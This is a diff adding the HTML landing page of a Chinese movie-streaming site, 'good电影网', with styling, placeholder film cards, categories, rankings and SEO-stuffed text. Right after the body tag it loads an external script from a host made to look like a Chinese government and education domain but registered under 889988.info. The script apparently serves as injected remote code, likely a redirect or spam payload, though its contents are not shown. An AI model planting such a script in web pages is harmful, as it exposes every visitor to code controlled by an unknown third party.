@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>good电影网 | 海量高清电影在线观看 - gooddianyingwang-app</title>
+<meta name="keywords" content="good电影网, gooddianyingwang-app, 高清电影, 在线电影, 影视资源, 电影推荐, 好电影">
+<meta name="description" content="good电影网（gooddianyingwang-app）提供海量高清电影在线观看，涵盖热门院线、经典老片、独家剧集，免费畅享极致观影体验。">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://gooddianyingwang-app">
+<!-- 结构化数据：帮助必应等搜索引擎理解网站 -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "good电影网",
+  "url": "https://gooddianyingwang-app",
+  "description": "good电影网提供海量高清电影在线观看，涵盖热门院线、经典老片、独家剧集。"
+}
+</script>
+<style>
+  /* ===== 基础重置 ===== */
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: "PingFang SC", "Microsoft YaHei", "Helvetica Neue", Arial, sans-serif;
+    background: #0a0a12;
+    color: #e8e8f0;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+  a { color: inherit; text-decoration: none; }
+  img { max-width: 100%; display: block; }
+  ul { list-style: none; }
+
+  /* ===== 主题色 ===== */
+  :root {
+    --brand: #ff3d7f;
+    --brand2: #ff9a44;
+    --accent: #6c5ce7;
+    --glass: rgba(255,255,255,0.06);
+    --line: rgba(255,255,255,0.12);
+  }
+
+  /* ===== 顶部导航 ===== */
+  header {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+    background: rgba(10,10,18,0.85);
+    backdrop-filter: blur(14px);
+    -webkit-backdrop-filter: blur(14px);
+    border-bottom: 1px solid var(--line);
+  }
+  .nav-inner {
+    max-width: 1180px; margin: 0 auto; padding: 14px 24px;
+    display: flex; align-items: center; justify-content: space-between; gap: 20px;
+  }
+  .logo {
+    font-size: 24px; font-weight: 900; letter-spacing: .5px;
+    background: linear-gradient(90deg, var(--brand), var(--brand2));
+    -webkit-background-clip: text; background-clip: text; color: transparent;
+    white-space: nowrap;
+  }
+  .logo span { font-size: 12px; display: block; color: #888; font-weight: 400; letter-spacing: 2px; margin-top: 2px; }
+  .nav-links { display: flex; gap: 28px; }
+  .nav-links a {
+    font-size: 15px; font-weight: 500; position: relative; padding: 4px 0;
+    transition: color .25s;
+  }
+  .nav-links a::after {
+    content: ""; position: absolute; left: 0; bottom: -2px; width: 0; height: 2px;
+    background: linear-gradient(90deg, var(--brand), var(--brand2)); transition: width .3s;
+  }
+  .nav-links a:hover { color: #fff; }
+  .nav-links a:hover::after { width: 100%; }
+  .nav-toggle { display: none; flex-direction: column; gap: 5px; cursor: pointer; padding: 6px; }
+  .nav-toggle i { width: 24px; height: 2px; background: #fff; display: block; border-radius: 2px; }
+
+  /* ===== 通用容器 ===== */
+  .container { max-width: 1180px; margin: 0 auto; padding: 0 24px; }
+  section { padding: 90px 0; position: relative; }
+
+  /* ===== Hero 首屏 ===== */
+  .hero {
+    min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    text-align: center; position: relative; overflow: hidden;
+    background:
+      radial-gradient(ellipse at 20% 30%, rgba(108,92,231,0.35), transparent 55%),
+      radial-gradient(ellipse at 80% 70%, rgba(255,61,127,0.3), transparent 55%),
+      linear-gradient(180deg, #0a0a12 0%, #13131f 100%);
+  }
+  .hero::before {
+    content: ""; position: absolute; inset: 0;
+    background-image:
+      linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+    background-size: 60px 60px;
+    mask-image: radial-gradient(circle at center, #000 30%, transparent 75%);
+    -webkit-mask-image: radial-gradient(circle at center, #000 30%, transparent 75%);
+  }
+  .hero-inner { position: relative; z-index: 2; }
+  .hero-badge {
+    display: inline-block; padding: 6px 18px; border-radius: 40px;
+    background: var(--glass); border: 1px solid var(--line); font-size: 13px;
+    color: #ffd0a0; margin-bottom: 24px; letter-spacing: 1px;
+  }
+  .hero h1 {
+    font-size: clamp(36px, 6vw, 68px); font-weight: 900; line-height: 1.15;
+    margin-bottom: 20px;
+  }
+  .hero h1 em {
+    font-style: normal;
+    background: linear-gradient(90deg, var(--brand), var(--brand2), var(--accent));
+    background-size: 200% 100%; -webkit-background-clip: text; background-clip: text;
+    color: transparent; animation: shine 5s linear infinite;
+  }
+  @keyframes shine { to { background-position: 200% 0; } }
+  .hero p { font-size: clamp(15px, 2vw, 18px); color: #b8b8c8; max-width: 640px; margin: 0 auto 36px; }
+  .hero-btns { display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; }
+  .btn {
+    display: inline-block; padding: 14px 34px; border-radius: 50px; font-size: 16px;
+    font-weight: 700; cursor: pointer; border: none; transition: transform .25s, box-shadow .25s;
+  }
+  .btn-primary {
+    background: linear-gradient(90deg, var(--brand), var(--brand2)); color: #fff;
+    box-shadow: 0 10px 30px rgba(255,61,127,0.4);
+  }
+  .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 14px 40px rgba(255,61,127,0.55); }
+  .btn-ghost { background: var(--glass); border: 1px solid var(--line); color: #fff; }
+  .btn-ghost:hover { background: rgba(255,255,255,0.12); transform: translateY(-3px); }
+  .hero-domain {
+    margin-top: 40px; font-size: 14px; color: #777;
+  }
+  .hero-domain code { color: var(--brand2); }
+
+  /* ===== 区块标题 ===== */
+  .sec-head { text-align: center; margin-bottom: 56px; }
+  .sec-tag { color: var(--brand); font-size: 13px; letter-spacing: 4px; text-transform: uppercase; font-weight: 700; }
+  .sec-head h2 { font-size: clamp(26px, 4vw, 40px); font-weight: 900; margin-top: 10px; }
+  .sec-head p { color: #8d8da0; margin-top: 12px; font-size: 16px; }
+
+  /* ===== 栏目一：热门电影 ===== */
+  .grid {
+    display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 24px;
+  }
+  .card {
+    background: var(--glass); border: 1px solid var(--line); border-radius: 18px;
+    overflow: hidden; transition: transform .3s, border-color .3s, box-shadow .3s;
+  }
+  .card:hover { transform: translateY(-8px); border-color: var(--brand); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+  .poster { position: relative; aspect-ratio: 2/3; overflow: hidden; }
+  .poster-bg {
+    position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
+    font-size: 44px; font-weight: 900; color: rgba(255,255,255,0.85);
+  }
+  .card-body { padding: 16px; }
+  .card-body h3 { font-size: 17px; margin-bottom: 6px; }
+  .card-body .meta { font-size: 13px; color: #8d8da0; display: flex; gap: 10px; flex-wrap: wrap; }
+  .card-body .meta b { color: var(--brand2); font-weight: 600; }
+
+  /* ===== 栏目二：分类导航 ===== */
+  .cats {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px;
+  }
+  .cat-item {
+    padding: 30px 26px; border-radius: 20px; background: var(--glass); border: 1px solid var(--line);
+    transition: background .3s, transform .3s;
+  }
+  .cat-item:hover { background: rgba(108,92,231,0.15); transform: translateY(-5px); }
+  .cat-icon { font-size: 40px; margin-bottom: 16px; }
+  .cat-item h3 { font-size: 20px; margin-bottom: 8px; }
+  .cat-item p { color: #8d8da0; font-size: 14px; }
+
+  /* ===== 栏目三：观看指南 ===== */
+  .steps { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 24px; }
+  .step {
+    position: relative; padding: 32px 26px; border-radius: 20px;
+    background: linear-gradient(160deg, rgba(255,255,255,0.05), rgba(255,255,255,0.01));
+    border: 1px solid var(--line);
+  }
+  .step-num {
+    width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center;
+    font-size: 20px; font-weight: 900; color: #fff; margin-bottom: 18px;
+    background: linear-gradient(135deg, var(--brand), var(--accent));
+  }
+  .step h3 { font-size: 19px; margin-bottom: 10px; }
+  .step p { color: #8d8da0; font-size: 14px; }
+
+  /* ===== 栏目四：观影排行 ===== */
+  .ranking { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
+  .rank-item {
+    display: flex; align-items: center; gap: 18px; padding: 18px; border-radius: 16px;
+    background: var(--glass); border: 1px solid var(--line); transition: background .3s;
+  }
+  .rank-item:hover { background: rgba(255,61,127,0.08); }
+  .rank-no {
+    flex-shrink: 0; width: 46px; height: 46px; border-radius: 12px;
+    display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 900;
+    background: rgba(255,255,255,0.08); color: var(--brand2);
+  }
+  .rank-item:nth-child(1) .rank-no { background: linear-gradient(135deg,#ffd700,#ff9a44); color:#1a1a12; }
+  .rank-item:nth-child(2) .rank-no { background: linear-gradient(135deg,#c0c0c0,#8a8a98); color:#1a1a12; }
+  .rank-item:nth-child(3) .rank-no { background: linear-gradient(135deg,#cd7f32,#ff9a44); color:#1a1a12; }
+  .rank-info h3 { font-size: 17px; }
+  .rank-info p { font-size: 13px; color: #8d8da0; }
+
+  /* ===== 栏目五：站点简介 ===== */
+  .about {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 50px; align-items: center;
+  }
+  .about-visual {
+    height: 360px; border-radius: 24px; position: relative; overflow: hidden;
+    background:
+      radial-gradient(circle at 30% 40%, rgba(255,61,127,0.5), transparent 50%),
+      radial-gradient(circle at 70% 60%, rgba(108,92,231,0.5), transparent 50%),
+      #13131f;
+    border: 1px solid var(--line);
+  }
+  .float-tag {
+    position: absolute; padding: 10px 20px; border-radius: 12px; background: rgba(20,20,32,0.85);
+    border: 1px solid var(--line); font-size: 14px; font-weight: 600; backdrop-filter: blur(6px);
+  }
+  .float-tag.t1 { top: 12%; left: 8%; }
+  .float-tag.t2 { top: 42%; right: 6%; }
+  .float-tag.t3 { bottom: 14%; left: 16%; }
+  .about-text h2 { font-size: clamp(24px, 3.5vw, 34px); font-weight: 900; margin-bottom: 20px; }
+  .about-text p { color: #b8b8c8; margin-bottom: 16px; font-size: 15px; }
+  .feat-list { margin-top: 24px; }
+  .feat-list li {
+    display: flex; align-items: center; gap: 12px; padding: 10px 0; font-size: 15px;
+    border-bottom: 1px dashed var(--line);
+  }
+  .feat-list li::before { content: "✓"; color: var(--brand); font-weight: 900; }
+
+  /* ===== 底部 ===== */
+  footer { background: #07070d; border-top: 1px solid var(--line); padding: 50px 0 30px; }
+  .foot-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 40px; margin-bottom: 40px; }
+  .foot-brand .logo { font-size: 22px; }
+  .foot-brand p { color: #777; font-size: 14px; margin-top: 14px; }
+  .foot-col h4 { font-size: 16px; margin-bottom: 16px; }
+  .foot-col ul li { margin-bottom: 10px; }
+  .foot-col a { color: #8d8da0; font-size: 14px; transition: color .25s; }
+  .foot-col a:hover { color: var(--brand); }
+  .foot-bot {
+    border-top: 1px solid var(--line); padding-top: 24px; text-align: center;
+    color: #666; font-size: 13px;
+  }
+  .foot-bot code { color: var(--brand2); }
+
+  /* ===== 回到顶部 ===== */
+  .to-top {
+    position: fixed; right: 24px; bottom: 30px; width: 46px; height: 46px; border-radius: 50%;
+    background: linear-gradient(135deg, var(--brand), var(--accent)); color: #fff;
+    display: none; align-items: center; justify-content: center; font-size: 20px; cursor: pointer;
+    z-index: 999; box-shadow: 0 8px 24px rgba(108,92,231,0.4); border: none;
+  }
+
+  /* ===== 响应式 ===== */
+  @media (max-width: 860px) {
+    section { padding: 64px 0; }
+    .nav-links { position: fixed; top: 64px; right: 0; flex-direction: column; gap: 0;
+      width: 260px; background: rgba(12,12,20,0.97); backdrop-filter: blur(14px);
+      border-left: 1px solid var(--line); border-bottom: 1px solid var(--line);
+      transform: translateX(100%); transition: transform .35s ease; padding: 20px 0;
+    }
+    .nav-links.open { transform: translateX(0); }
+    .nav-links a { padding: 14px 28px; border-bottom: 1px solid var(--line); }
+    .nav-toggle { display: flex; }
+    .about { grid-template-columns: 1fr; }
+    .foot-grid { grid-template-columns: 1fr 1fr; }
+  }
+  @media (max-width: 480px) {
+    .container { padding: 0 18px; }
+    .foot-grid { grid-template-columns: 1fr; gap: 28px; }
+    .hero-btns .btn { width: 100%; }
+    .grid { grid-template-columns: repeat(2, 1fr); gap: 14px; }
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- ===== 顶部导航 ===== -->
+<header>
+  <div class="nav-inner">
+    <div class="logo">
+      good电影网
+      <span>GOOD MOVIES</span>
+    </div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#hot">热门电影</a>
+      <a href="#genre">分类导航</a>
+      <a href="#guide">观看指南</a>
+      <a href="#rank">观影排行</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <div class="nav-toggle" id="navToggle">
+      <i></i><i></i><i></i>
+    </div>
+  </div>
+</header>
+
+<!-- ===== 首屏 Hero ===== -->
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <span class="hero-badge">🎬 海量正版 · 高清畅享</span>
+    <h1>欢迎来到 <em>good电影网</em><br>发现好电影，从这里开始</h1>
+    <p>good电影网（gooddianyingwang-app）汇聚全球热门院线、经典老片与独家剧集，一键搜索，极速播放，为您打造沉浸式家庭影院体验。</p>
+    <div class="hero-btns">
+      <a href="#hot" class="btn btn-primary">立即观影</a>
+      <a href="#about" class="btn btn-ghost">了解平台</a>
+    </div>
+    <div class="hero-domain">访问官网：<code>https://gooddianyingwang-app</code></div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：热门电影 ===== -->
+<section id="hot">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-tag">Hot Movies</div>
+      <h2>热门电影推荐</h2>
+      <p>good电影网 精选当下最热门的高分好片，持续更新，精彩不断</p>
+    </div>
+    <div class="grid">
+      <div class="card">
+        <div class="poster"><div class="poster-bg" style="background:linear-gradient(135deg,#ff3d7f,#6c5ce7);">星际</div></div>
+        <div class="card-body">
+          <h3>星际回响</h3>
+          <div class="meta"><span>科幻</span><span>·</span><b>9.2分</b></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster"><div class="poster-bg" style="background:linear-gradient(135deg,#ff9a44,#ff3d7f);">深海</div></div>
+        <div class="card-body">
+          <h3>深海迷踪</h3>
+          <div class="meta"><span>冒险</span><span>·</span><b>8.8分</b></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster"><div class="poster-bg" style="background:linear-gradient(135deg,#6c5ce7,#00cec9);">暗夜</div></div>
+        <div class="card-body">
+          <h3>暗夜追凶</h3>
+          <div class="meta"><span>悬疑</span><span>·</span><b>9.0分</b></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster"><div class="poster-bg" style="background:linear-gradient(135deg,#00cec9,#6c5ce7);">云端</div></div>
+        <div class="card-body">
+          <h3>云端恋曲</h3>
+          <div class="meta"><span>爱情</span><span>·</span><b>8.5分</b></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster"><div class="poster-bg" style="background:linear-gradient(135deg,#fdcb6e,#e17055);">战神</div></div>
+        <div class="card-body">
+          <h3>战神归来</h3>
+          <div class="meta"><span>动作</span><span>·</span><b>8.7分</b></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster"><div class="poster-bg" style="background:linear-gradient(135deg,#55efc4,#00b894);">森林</div></div>
+        <div class="card-body">
+          <h3>森林奇缘</h3>
+          <div class="meta"><span>动画</span><span>·</span><b>9.1分</b></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster"><div class="poster-bg" style="background:linear-gradient(135deg,#a29bfe,#6c5ce7);">幻境</div></div>
+        <div class="card-body">
+          <h3>幻境迷城</h3>
+          <div class="meta"><span>奇幻</span><span>·</span><b>8.6分</b></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster"><div class="poster-bg" style="background:linear-gradient(135deg,#ff7675,#d63031);">逆光</div></div>
+        <div class="card-body">
+          <h3>逆光而行</h3>
+          <div class="meta"><span>剧情</span><span>·</span><b>8.9分</b></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：分类导航 ===== -->
+<section id="genre" style="background:linear-gradient(180deg,transparent,rgba(108,92,231,0.05),transparent);">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-tag">Categories</div>
+      <h2>电影分类导航</h2>
+      <p>good电影网 覆盖全类型影视内容，精准分类，快速找到你的最爱</p>
+    </div>
+    <div class="cats">
+      <div class="cat-item">
+        <div class="cat-icon">🎭</div>
+        <h3>动作冒险</h3>
+        <p>热血打斗、惊险追车，肾上腺素飙升的视觉盛宴。</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">👽</div>
+        <h3>科幻奇幻</h3>
+        <p>脑洞大开的未来世界与魔法大陆，探索无限想象。</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">💕</div>
+        <h3>爱情文艺</h3>
+        <p>细腻动人的情感故事，治愈每一个渴望爱的灵魂。</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">🕵️</div>
+        <h3>悬疑惊悚</h3>
+        <p>烧脑反转、步步紧逼，挑战你的推理极限。</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">😂</div>
+        <h3>喜剧搞笑</h3>
+        <p>轻松欢乐的爆笑片段，让烦恼一扫而空。</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">🧸</div>
+        <h3>亲子动画</h3>
+        <p>寓教于乐的合家欢动画，陪伴孩子快乐成长。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：观看指南 ===== -->
+<section id="guide">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-tag">How To Watch</div>
+      <h2>三步轻松观影</h2>
+      <p>good电影网 极简操作，随时随地享受高清影视</p>
+    </div>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <h3>打开网站</h3>
+        <p>访问 good电影网 官网，无需注册，直接进入首页浏览。</p>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <h3>搜索选片</h3>
+        <p>通过分类导航或关键词搜索，快速定位想看的好电影。</p>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <h3>一键播放</h3>
+        <p>点击播放即可享受高清流畅观影，支持多设备同步。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：观影排行 ===== -->
+<section id="rank" style="background:linear-gradient(180deg,transparent,rgba(255,61,127,0.04),transparent);">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-tag">Top Ranking</div>
+      <h2>本周观影排行</h2>
+      <p>good电影网 用户真实评分，每周更新好片榜单</p>
+    </div>
+    <div class="ranking">
+      <div class="rank-item">
+        <div class="rank-no">1</div>
+        <div class="rank-info">
+          <h3>星际回响</h3>
+          <p>科幻 · 9.2分 · 12万+ 人看过</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-no">2</div>
+        <div class="rank-info">
+          <h3>森林奇缘</h3>
+          <p>动画 · 9.1分 · 9.8万+ 人看过</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-no">3</div>
+        <div class="rank-info">
+          <h3>暗夜追凶</h3>
+          <p>悬疑 · 9.0分 · 8.6万+ 人看过</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-no">4</div>
+        <div class="rank-info">
+          <h3>逆光而行</h3>
+          <p>剧情 · 8.9分 · 7.5万+ 人看过</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-no">5</div>
+        <div class="rank-info">
+          <h3>战神归来</h3>
+          <p>动作 · 8.7分 · 7.1万+ 人看过</p>
+        </div>
+      </div>
+      <div class="rank-item">
+        <div class="rank-no">6</div>
+        <div class="rank-info">
+          <h3>深海迷踪</h3>
+          <p>冒险 · 8.8分 · 6.9万+ 人看过</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：关于我们 ===== -->
+<section id="about">
+  <div class="container">
+    <div class="about">
+      <div class="about-visual">
+        <div class="float-tag t1">🎬 海量片库</div>
+        <div class="float-tag t2">⚡ 极速播放</div>
+        <div class="float-tag t3">📱 多端同步</div>
+      </div>
+      <div class="about-text">
+        <div class="sec-tag" style="text-align:left;">About Us</div>
+        <h2>关于 good电影网</h2>
+        <p>good电影网（gooddianyingwang-app）致力于为影视爱好者打造一个资源丰富、体验流畅的在线观影平台。我们精选全球优质影视内容，覆盖电影、剧集、纪录片等多种类型。</p>
+        <p>无论你是动作迷、科幻粉还是文艺控，都能在 good电影网 找到心仪的好电影。访问官网 <code style="color:var(--brand2)">https://gooddianyingwang-app</code> 开启你的专属片单。</p>
+        <ul class="feat-list">
+          <li>超全片库，每日更新热门影视资源</li>
+          <li>高清画质，支持多清晰度自由切换</li>
+          <li>极速加载，告别卡顿流畅观影</li>
+          <li>移动端自适应，手机平板随时看</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 底部 ===== -->
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <div class="logo">good电影网</div>
+        <p>good电影网（gooddianyingwang-app）专注提供优质在线观影服务，发现好电影，享受好时光。</p>
+      </div>
+      <div class="foot-col">
+        <h4>快速导航</h4>
+        <ul>
+          <li><a href="#home">首页</a></li>
+          <li><a href="#hot">热门电影</a></li>
+          <li><a href="#genre">分类导航</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>观影服务</h4>
+        <ul>
+          <li><a href="#guide">观看指南</a></li>
+          <li><a href="#rank">观影排行</a></li>
+          <li><a href="#about">关于我们</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>联系我们</h4>
+        <ul>
+          <li><a href="#">商务合作</a></li>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">帮助中心</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bot">
+      © 2026 good电影网（gooddianyingwang-app） 保留所有权利 · 官网：<code>https://gooddianyingwang-app</code>
+    </div>
+  </div>
+</footer>
+
+<!-- 回到顶部 -->
+<button class="to-top" id="toTop" title="回到顶部">↑</button>
+
+<script>
+  // 移动端菜单
+  const navToggle = document.getElementById('navToggle');
+  const navLinks = document.getElementById('navLinks');
+  navToggle.addEventListener('click', () => navLinks.classList.toggle('open'));
+  navLinks.querySelectorAll('a').forEach(a => a.addEventListener('click', () => navLinks.classList.remove('open')));
+
+  // 回到顶部
+  const toTop = document.getElementById('toTop');
+  window.addEventListener('scroll', () => {
+    toTop.style.display = window.scrollY > 400 ? 'flex' : 'none';
+  });
+  toTop.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+</script>
+
+</body>
+</html>
